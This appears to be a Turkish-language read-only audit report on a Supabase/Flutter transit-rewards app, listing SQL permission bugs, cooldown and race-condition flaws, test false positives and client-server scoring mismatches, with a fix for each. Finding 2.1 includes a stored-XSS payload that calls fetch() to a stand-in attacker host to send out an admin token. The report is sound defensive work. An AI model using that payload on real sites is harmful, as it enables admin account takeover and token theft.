# Revizyon 03 Bağımsız Kod ve Mimari İnceleme Raporu

**İnceleme Türü:** Salt Okunur Bağımsız Ürün & Güvenlik Denetimi  
**Kapsam:** `supabase/migrations/06_revizyon_03.sql`, `supabase/verification_rev03.sql`, `tools/universal_gm/`, `tools/test_two_sessions.dart`, `lib/` (Sensör, Outbox, Classifier, Store, Ekranlar).  
**Kural:** Diğer AGY kod yazmaktadır; kod/SQL dosyalarına dokunulmamış, yalnızca bu rapor üretilmiştir. Genel öğüt içermez; doğrudan dosya/satır, tetikleme senaryosu ve somut düzeltme içerir.

---

## 1. Dağıtım Engelleri (06 Migration Deploy Blockers)

### 🔴 Kusur 1.1: `v_clan_shame_board` ve `v_global_shame_board` `security_invoker = true` Nedeniyle Çöküyor (Postgres 42501 Permission Denied)
* **Dosya & Satır:** [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L47-L54), [02_security_rls.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/02_security_rls.sql#L72-L77)
* **Tetikleme Senaryosu:** `anon` veya `authenticated` istemcisi `SELECT * FROM v_clan_shame_board` veya `v_global_shame_board` çalıştırdığında.
* **Kök Neden:** `01_schema.sql` içinde bu görünümler varsayılan `SECURITY DEFINER` idi ve `public.users` üzerindeki `weekly_car_taxi_trips`, `weekly_car_taxi_km`, `weekly_wasted_co2_kg` sütunlarını okuyordu. `02_security_rls.sql` içinde bu sütunlar `anon` ve `authenticated` rollerine GRANT EDİLMEMİŞTİR (kamusal sütun izni yoktur). `06_revizyon_03.sql` içinde `ALTER VIEW ... SET (security_invoker = true)` yapılmış ancak ilgili 3 sütuna SELECT izni verilmemiştir (yalnızca `clan_role` açılmıştır: [06_revizyon_03.sql#L62-L63](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L62-L63)). Çağrıcı rol bu sütunlara yetkili olmadığı için Postgres `ERROR 42501: permission denied for column weekly_wasted_co2_kg` fırlatır.
* **Beklenen Düzeltme:** `06_revizyon_03.sql` içine şu grant eklenmelidir:
  ```sql
  GRANT SELECT (clan_role, weekly_car_taxi_trips, weekly_car_taxi_km, weekly_wasted_co2_kg) ON public.users TO anon, authenticated;
  ```

---

### 🔴 Kusur 1.2: Ters Sırada QR Binişinde Çift Ödül Açığı (Generic Cooldown vs Stop Cooldown Uyuşmazlığı)
* **Dosya & Satır:** [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L454-L459), [03_functions_and_rpc.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/03_functions_and_rpc.sql#L525-L538)
* **Tetikleme Senaryosu:** Yolcu otobüse biner; otomatik motor yolculuğu tamamlayıp `rpc_record_bus_trip` çağırır ve +3 puan alır. Kullanıcı hemen ardından veya inişte durağın QR kodunu okutur (`rpc_record_transit`).
* **Kök Neden:** `rpc_record_bus_trip`, `transit_cooldowns` tablosuna `stop_code = 'AUTO_BUS_TRIP'` yazar. Ancak `03_functions_and_rpc.sql` içindeki `rpc_record_transit` fonksiyonu cooldown kontrolünü yalnızca `WHERE user_id = v_user_id AND stop_code = v_stop.stop_code` ile yapar. `AUTO_BUS_TRIP` kaydını veya son 45 dakikadaki genel biniş geçmişini denetlemez. QR taraması cooldown'a takılmaz; kullanıcı aynı yolculuk için ikinci kez +3 puan ve CO₂ tasarrufu alır.
* **Beklenen Düzeltme:** `03_functions_and_rpc.sql`'deki `rpc_record_transit` içine genel transit cooldown denetimi eklenmelidir:
  ```sql
  SELECT last_scanned_at INTO v_last_scan
  FROM public.transit_cooldowns
  WHERE user_id = v_user_id
    AND (stop_code = v_stop.stop_code OR stop_code = 'AUTO_BUS_TRIP')
    AND last_scanned_at >= NOW() - INTERVAL '45 minutes';
  ```

---

### 🔴 Kusur 1.3: `rpc_record_transit` İçinde Row Lock Eksikliği Nedeniyle Eşzamanlı Yarış Durumu
* **Dosya & Satır:** [03_functions_and_rpc.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/03_functions_and_rpc.sql#L490), [L525-L545](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/03_functions_and_rpc.sql#L525-L545)
* **Tetikleme Senaryosu:** Zayıf ağda aynı anda iki paralel QR/NFC isteği veya otomatik bus olayı ile QR taraması aynı anda sunucuya ulaştığında.
* **Kök Neden:** `rpc_record_transit` yalnızca `PERFORM pg_advisory_xact_lock(hashtext(v_user_id::text || ':' || p_event_id))` almaktadır. İki farklı olay (`p_event_id`) farklı kilit anahtarı ürettiğinden birbirini bloklamaz. Fonksiyon içinde `public.users` üzerinde `FOR UPDATE` satır kilidi yoktur. Her iki işlem de aynı milisaniyede `v_last_scan IS NULL` okur, ikisi de cooldown'ı geçer ve kullanıcıya mükerrer puan yazar.
* **Beklenen Düzeltme:** `rpc_record_transit` fonksiyonunda cooldown kontrolünden önce kullanıcı satır kilidi alınmalıdır:
  ```sql
  SELECT * INTO v_user FROM public.users WHERE id = v_user_id FOR UPDATE;
  ```

---

### 🔴 Kusur 1.4: Admin Audit FK / `public.users` Profil Eksikliği
* **Dosya & Satır:** [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L497-L507), [setup_admin_session.dart](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/setup_admin_session.dart#L32-L61)
* **Tetikleme Senaryosu:** `setup_admin_session.dart` çalıştırılarak oluşturulan anonim admin hesabı ile GM aksiyonu yapıldığında.
* **Kök Neden:** Script yalnızca `auth/v1/signup` çağırır ve Root'a `server_admins` tablosuna INSERT SQL'i üretir ([grant_admin.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/grant_admin.sql#L7-L10)). Ancak admin için `public.users` profili (`rpc_sync_initial_profile`) oluşturulmaz. `admin_audit_trail` tablosundaki `target_user_id` `REFERENCES public.users(id)` kısıtına sahiptir. Eğer admin kendi profilini hedeflerse foreign key kısıt ihlaliyle patlar; ayrıca admin kullanıcı genel kullanıcı tablolarında profil kaydı olmadan sahipsiz kalır.
* **Beklenen Düzeltme:** `setup_admin_session.dart`, `signup` sonrası admin için `rpc_sync_initial_profile` RPC'sini çağırmalı veya `grant_admin.sql` dosyasına `public.users` insert'i eklenmelidir.

---

## 2. Güvenlik Açıkları & GM Web Paneli

### 🔴 Kusur 2.1: GM Panelinde Stored XSS Açığıyla Admin Token Çalınması (Tam Hesap Ele Geçirme)
* **Dosya & Satır:** [index.html](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/index.html#L343-L353), [L298](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/index.html#L298), [L308](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/index.html#L308)
* **Tetikleme Senaryosu:** Herhangi bir kötü niyetli kullanıcı kendi `nickname` veya `clan_name` alanını `<img src=x onerror="fetch('https://attacker.site/?t='+localStorage.getItem('gm_admin_token'))">` yapar. Yönetici PC tarayıcısından GM panelini açıp kullanıcı listesini yükler.
* **Kök Neden:** `renderUsersList()` içinde `div.innerHTML = ... ${u.nickname} ...` kullanılmıştır. Kullanıcı girdisi kaçış yapılmadan (unescaped) doğrudan DOM'a HTML olarak basılır. Yönetici tarayıcısında JavaScript çalışarak `localStorage` içindeki `gm_admin_token` ve `gm_refresh_token` saldırgana gönderilir.
* **Beklenen Düzeltme:** `div.innerHTML` yerine güvenli DOM manipülasyonu (`textContent` veya HTML escaping) kullanılmalıdır:
  ```javascript
  const nameDiv = document.createElement('div');
  nameDiv.textContent = u.nickname + (u.is_demo ? ' [DEMO]' : '');
  ```

---

### 🔴 Kusur 2.2: Gizli Oturum Dosyasının HTTP Web Root İçine Yazılması ve Açığa Çıkması
* **Dosya & Satır:** [setup_admin_session.dart](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/setup_admin_session.dart#L65), [BOOTSTRAP_GUIDE.md](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/BOOTSTRAP_GUIDE.md#L40)
* **Tetikleme Senaryosu:** Kılavuzdaki `python3 -m http.server 8080 --directory tools/universal_gm` komutu çalıştırıldığında.
* **Kök Neden:** `setup_admin_session.dart` dosyayı `tools/universal_gm/gm_admin_session.private.json` konumuna yazar. Python basit HTTP sunucusu bu dizini web root olarak sunar. Tarayıcıdan veya ağdan `http://localhost:8080/gm_admin_session.private.json` adresine yapılan GET isteği, dosya `.gitignore` içinde olsa dahi gizli JWT access ve refresh tokenlarını doğrudan sunar. Root bunu açıkça yasaklamıştı.
* **Beklenen Düzeltme:** Dosya web root dışına yazılmalıdır (örneğin `.gm-private/session.json` veya proje kökü).

---

### 🔴 Kusur 2.3: `setup_admin_session.dart` Her Çalıştırmada Yeni Admin Açarak Auth Veritabanını Kirletiyor
* **Dosya & Satır:** [setup_admin_session.dart](file:///home/girdap/Masaüstü/Green_Project/tools/universal_gm/setup_admin_session.dart#L28-L38)
* **Tetikleme Senaryosu:** Kurulum scripti birden fazla kez çalıştırıldığında.
* **Kök Neden:** Mevcut bir oturum dosyası olup olmadığını denetlemez. Her çalıştırmada `gm_admin_${DateTime.now().millisecondsSinceEpoch}@internal.local` adıyla yeni bir kullanıcı oluşturur.
* **Beklenen Düzeltme:** Script önce mevcut özel dosyayı kontrol etmeli; geçerliyse veya refresh token varsa mevcut oturumu yenileyip UID'yi korumalıdır.

---

## 3. İki Oturum Test Aracı Sahte Pozitif Riski (`tools/test_two_sessions.dart`)

### 🔴 Kusur 3.1: Henüz Dağıtılmamış API'ler HTTP 404 Döndürdüğünde Testin "Başarılı" Sayılması
* **Dosya & Satır:** [test_two_sessions.dart](file:///home/girdap/Masaüstü/Green_Project/tools/test_two_sessions.dart#L192-L199), [L220-L225](file:///home/girdap/Masaüstü/Green_Project/tools/test_two_sessions.dart#L220-L225), [L244-L249](file:///home/girdap/Masaüstü/Green_Project/tools/test_two_sessions.dart#L244-L249), [L165-L170](file:///home/girdap/Masaüstü/Green_Project/tools/test_two_sessions.dart#L165-L170)
* **Tetikleme Senaryosu:** `06_revizyon_03.sql` canlı Supabase'e henüz uygulanmamışken `test_two_sessions.dart` çalıştırıldığında.
* **Kök Neden:** Test fonksiyonlarındaki assertion mantığı şöyledir:
  ```dart
  if (res.statusCode == 200) {
    if (json['ok'] == true) throw Exception('Güvenlik İhlali!');
  }
  stdout.writeln('  ✅ Başarıyla engellendi');
  ```
  Henüz var olmayan `rpc_universal_gm_action`, `rpc_record_bus_trip`, `rpc_send_shame_message` ve `admin_audit_trail` HTTP 404 (Not Found) döndürmektedir. `statusCode == 200` bloğu atlanır ve test tüm kontrolleri "başarılı" sayıp 0 exit code ile çıkar! Olmayan fonksiyonu doğrulanmış gibi raporlar.
* **Beklenen Düzeltme:** Test, HTTP 404 aldığında `Exception('Fonksiyon sunucuda mevcut değil: HTTP 404')` fırlatmalı; yetkisiz erişim için dönen hata kodunun ve Postgres istisnasının (`Yetkisiz erişim: Sunucu yöneticisi değilsiniz`) var olduğunu net biçimde assert etmelidir.

---

### 🔴 Kusur 3.2: RLS İzolasyon Testinde Boş Liste Üzerinde Boş Döngü (Vacuous Truth)
* **Dosya & Satır:** [test_two_sessions.dart](file:///home/girdap/Masaüstü/Green_Project/tools/test_two_sessions.dart#L146-L155)
* **Tetikleme Senaryosu:** Oturum A yeni açılmış ve envanterinde henüz hiçbir ürün yokken RLS testi çalıştığında.
* **Kök Neden:** Oturum B `user_inventory` sorgular; dönen `items` boş listedir (`[]`). `for (final it in items)` döngüsü sıfır kez döner. Hiçbir assert çalışmadan "✅ RLS İzolasyonu doğrulandı" yazdırılır.
* **Beklenen Düzeltme:** Oturum A'ya önce bir envanter öğesi atanmalı, ardından Oturum B'nin bu öğeyi görmediği assert edilmelidir.

---

## 4. İstemci - Sunucu Mantık, Cooldown ve Sayaç Tutarsızlıkları

### 🔴 Kusur 4.1: İstemci Kısa Yol Cezasında Net -3 Yerine Net 0 Puan Bırakıyor ve CO₂ Tasarrufunu İptal Etmiyor
* **Dosya & Satır:** [app_store.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/app_store.dart#L660-L685), [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L383-L400)
* **Tetikleme Senaryosu:** Kullanıcı binişte QR okutur (+3 puan ve 1.15 kg CO₂ alır). Yolculuk 300 metrede biter (≤500m kısa yol).
* **Kök Neden:**
  1. Sunucu tarafında `v_already_qr_settled` tespit edilerek `v_actual_deducted := 6` kesilir (+3 iptal + -3 ceza = net -3 puan).
  2. İstemcideki `applyShortBusPenalty` ise doğrudan `min(me!.weeklyPoints, 3)` düşer (`-3`). Kullanıcı binişte +3 aldığı için istemcideki net sonuç `+3 - 3 = 0` puandır (ceza sıfırlanır).
  3. İstemci, binişte verilen `1.15 kg CO₂` tasarrufunu iptal etmez; kısa yolda haksız CO₂ bakiyesi kalır.
  4. İstemci yerel bakiyesi ile sunucu bakiyesi arasında 3 puanlık kalıcı desenkronizasyon oluşur.
* **Beklenen Düzeltme:** İstemcideki `applyShortBusPenalty` fonksiyonunda son 45 dk içinde QR taraması varsa `actualDeducted = 6` olarak hesaplanmalı ve binişte eklenen CO₂ miktarı düşülmelidir.

---

### 🔴 Kusur 4.2: İstemci Cezada `allTimePoints` Düşüyor, Sunucu Düşmüyor
* **Dosya & Satır:** [app_store.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/app_store.dart#L320-L335), [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L402-L411)
* **Tetikleme Senaryosu:** Kısa otobüs cezası veya negatif puan uygulandığında.
* **Kök Neden:** İstemcideki `_award` metodu `allTimePoints: u.allTimePoints + points` diyerek tüm zamanlar puanından da düşmektedir. Sunucuda ise şartname gereği `UPDATE public.users SET weekly_points = weekly_points - v_actual_deducted` çalışır; `all_time_points` korunur. Cihaz yerel verisi ile sunucu all-time puanı uyuşmazlığa düşer.
* **Beklenen Düzeltme:** `_award` metodu negatif puanlarda (`points < 0`) `allTimePoints` alanını eksiltmemelidir.

---

### 🔴 Kusur 4.3: İstemcide Cooldown Anahtar Ayrılığı (`BUS_TRIP` vs Durak Kodu)
* **Dosya & Satır:** [app_store.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/app_store.dart#L603), [L641](file:///home/girdap/Masaüstü/Green_Project/lib/services/app_store.dart#L641)
* **Tetikleme Senaryosu:** Kullanıcı otomatik otobüs yolculuğu yaptıktan sonra QR okuttuğunda.
* **Kök Neden:** Otomatik otobüs `transitLast['BUS_TRIP'] = _nowMs` yazar; QR taraması ise `transitLast[code]` bakar. İstemci yerelinde de ters sırada işlem yapıldığında çift ödül engeli devreye girmez.
* **Beklenen Düzeltme:** `scanTransit` ve `creditBusTrip` ortak bir `transitInLast45Min` veya genel cooldown anahtarı üzerinden kilitlenmelidir.

---

## 5. Utanç Mesajı ve Altın Kaybı Riskleri

### 🔴 Kusur 5.1: Ağ Hatasında veya Sunucu Reddinde 10 Altının Geri Dönüşsüz Kaybolması (No Rollback)
* **Dosya & Satır:** [leaderboard_screen.dart](file:///home/girdap/Masaüstü/Green_Project/lib/screens/leaderboard/leaderboard_screen.dart#L691-L708)
* **Tetikleme Senaryosu:** Kullanıcı utanç dürtmesi gönderirken bağlantı koptuğunda veya sunucu hata döndürdüğünde.
* **Kök Neden:** İstemci, API çağrısı öncesinde altını peşinen düşer ve kotayı işaretler:
  ```dart
  store.me = store.me!.copyWith(goldCoins: store.me!.goldCoins - 10);
  store.markShameMessageSent();
  final res = await Hub.supabase.sendShameMessage(...);
  ```
  `res['ok'] == false` olduğunda veya exception fırlatıldığında altın bakiyesi ve kota ASLA iade edilmez (rollback yoktur). Kullanıcı mesaj iletilmediği halde 10 altınını kaybeder.
* **Beklenen Düzeltme:** Altın kesintisi sunucudan `res['ok'] == true` teyidi geldikten sonra uygulanmalı; hata durumunda iade edilmelidir.

---

### 🔴 Kusur 5.2: Utanç Mesajının Outbox Yerine Doğrudan Çağrılması
* **Dosya & Satır:** [leaderboard_screen.dart](file:///home/girdap/Masaüstü/Green_Project/lib/screens/leaderboard/leaderboard_screen.dart#L695), [supabase_service.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/supabase_service.dart#L545-L548)
* **Tetikleme Senaryosu:** Kullanıcı çevrimdışıyken veya metroda utanç mesajı göndermek istediğinde.
* **Kök Neden:** `SupabaseService.processOutbox` içinde `send_shame_message` işleyicisi yazılmış olmasına rağmen UI doğrudan `Hub.supabase.sendShameMessage()` çağırmaktadır. Çevrimdışıyken mesaj outbox'a atılmaz, hata verir.
* **Beklenen Düzeltme:** UI işlemi outbox üzerinden kuyruklamalı veya ağ yoksa kuyruk seçeneği sunmalıdır.

---

## 6. Outbox Retry ve Kalıcı Sessiz Veri Kaybı

### 🔴 Kusur 6.1: Dağıtım Öncesi / Geçici Hataların Kalıcı Karantinaya Alınması
* **Dosya & Satır:** [supabase_outbox.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/supabase_outbox.dart#L144-L153), [L162-L166](file:///home/girdap/Masaüstü/Green_Project/lib/services/supabase_outbox.dart#L162-L166)
* **Tetikleme Senaryosu:** Canlıda 06 migration uygulanmadan önce kullanıcının yaptığı yolculuklar outbox'a girdiğinde.
* **Kök Neden:** `isPermanentError` metodu `error.contains('not found')` veya `contains('bulunamadı')` denetimi yapar. Henüz sunucuda olmayan `rpc_record_bus_trip` çağrıldığında Postgres/Supabase `function not found` döner. Outbox bunu "zehirli paket" sayarak hemen `status = quarantined` yapar. `pendingItems` karantinadaki öğeleri ASLA tekrar denemez. Root migration'ı 1 saat sonra uygulasa bile bu olaylar yerel kuyrukta sessizce unutulur ve sunucuya asla iletilmez.
* **Beklenen Düzeltme:** Şema ve fonksiyon eksikliği hataları (`not found` / `42883`) karantinaya alınmamalı, üstel geri çekilme ile bekletilmeli; karantinadaki olaylar için UI'da manuel "Yeniden Dene" olanağı sağlanmalıdır.

---

## 7. Planlanan vs. Gerçek Çalışan Ayrımı ve Görsel Varlıklar

### ⚠️ Tespit 7.1: Sunucu `clan_role` Şemasının İstemcide Yok Sayılması (Sahte Dinamik Roller)
* **Dosya & Satır:** [clan_detail_screen.dart](file:///home/girdap/Masaüstü/Green_Project/lib/screens/clan/clan_detail_screen.dart#L69-L73), [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L58-L86)
* **Bulgu:** Sunucuda `public.users.clan_role` sütunu ve `v_clan_members` görünümü eklenmiş olmasına rağmen Flutter uygulamasında bu görünüm HİÇ SORGULANMAMAKTADIR. `_getMemberRole` metodu o anki haftalık puan listesinde 1. sıradaki kullanıcıya statik olarak "Lider", 2. ve 3. sıradakine "Kıdemli" unvanı vermektedir. Sunucudaki gerçek rol verisiyle hiçbir bağı yoktur.

---

### ⚠️ Tespit 7.2: Klanı Olmayan Kullanıcıların Zorla Clan 1'e Atanması
* **Dosya & Satır:** [supabase_service.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/supabase_service.dart#L440), [L375](file:///home/girdap/Masaüstü/Green_Project/lib/services/supabase_service.dart#L375)
* **Bulgu:** `clanId: Clan.sqlToId((row['clan_id'] as num?)?.toInt() ?? 1)` ifadesi, sunucudan `clan_id IS NULL` gelen kullanıcıları varsayılan olarak `clan_ktu_kanuni` klanına bağlamaktadır. Klansız kullanıcılar istemcide klan üyesi gibi gözükmektedir.

---

### ⚠️ Tespit 7.3: `v_worst_clans` Görünümünün İstemcide Çağrılmaması
* **Dosya & Satır:** [app_store.dart](file:///home/girdap/Masaüstü/Green_Project/lib/services/app_store.dart#L1126-L1157), [06_revizyon_03.sql](file:///home/girdap/Masaüstü/Green_Project/supabase/migrations/06_revizyon_03.sql#L93-L108)
* **Bulgu:** SQL'e eklenen `v_worst_clans` görünümü Flutter kodunda hiçbir yerde sorgulanmamaktadır. İstemci kendi `worstClans()` fonksiyonuyla yerel veri üzerinden sıralama yapmaktadır; ancak `v_leaderboard_users` tablosunda `weekly_wasted_co2_kg` sütunu bulunmadığı için sunucu kullanıcılarının israfı istemcide her zaman 0.0 kg kalmaktadır.

---

### ⚠️ Tespit 7.4: Boşta Kalan Görsel Varlık (`logo-klan-base.png`)
* **Dosya & Satır:** [league_tier.dart](file:///home/girdap/Masaüstü/Green_Project/lib/models/league_tier.dart#L30)
* **Bulgu:** `Logolar/logo-klan/logo-klan-base.png` pubspec'e eklenmiş ve `clanBaseAssetPath` sabiti açılmıştır; ancak UI'da hiçbir bileşende kullanılmamaktadır.

---

## 8. Root İçin Öncelikli Eylem Özeti

1. **06 Migration Dağıtılmadan Önce:**
   * `v_clan_shame_board` ve `v_global_shame_board` için gereken sütun grantlerini ekleyin ([Kusur 1.1](#-kusur-11-v_clan_shame_board-ve-v_global_shame_board-security_invoker--true-nedeniyle-çöküyor-postgres-42501-permission-denied)).
   * `rpc_record_transit` içine `AUTO_BUS_TRIP` genel cooldown kontrolünü ve FOR UPDATE kilidini ekleyin ([Kusur 1.2](#-kusur-12-ters-sırada-qr-binişinde-çift-ödül-açığı-generic-cooldown-vs-stop-cooldown-uyuşmazlığı), [Kusur 1.3](#-kusur-13-rpc_record_transit-içinde-row-lock-eksikliği-nedeniyle-eşzamanlı-yarış-durumu)).
2. **GM Paneli Açılmadan Önce:**
   * `index.html` içindeki `innerHTML` kullanımlarını `textContent` ile değiştirerek XSS açığını kapatın ([Kusur 2.1](#-kusur-21-gm-panelinde-stored-xss-açığıyla-admin-token-çalınması-tam-hesap-ele-geçirme)).
   * Özel oturum JSON dosyasını HTTP web root dışına taşıyın ([Kusur 2.2](#-kusur-22-gizli-oturum-dosyasının-http-web-root-içine-yazılması-ve-açığa-çıkması)).
3. **Ürün Ajanı (AGY Kodlama) Düzeltmeleri İçin:**
   * İstemcideki kısa otobüs ceza uzlaştırmasını ve CO₂ iadesini sunucuyla eşitleyin ([Kusur 4.1](#-kusur-41-istemci-kısa-yol-cezasında-net--3-yerine-net-0-puan-bırakıyor-ve-co-tasarrufunu-iptal-etmiyor)).
   * Utanç mesajında başarısızlık durumunda 10 altın iadesini sağlayın ([Kusur 5.1](#-kusur-51-ağ-hatasında-veya-sunucu-reddinde-10-altının-geri-dönüşsüz-kaybolması-no-rollback)).
   * `test_two_sessions.dart` içindeki HTTP 404 yutma hatasını giderin ([Kusur 3.1](#-kusur-31-henüz-dağıtılmamış-apiler-http-404-döndürdüğünde-testin-başarılı-sayılması)).
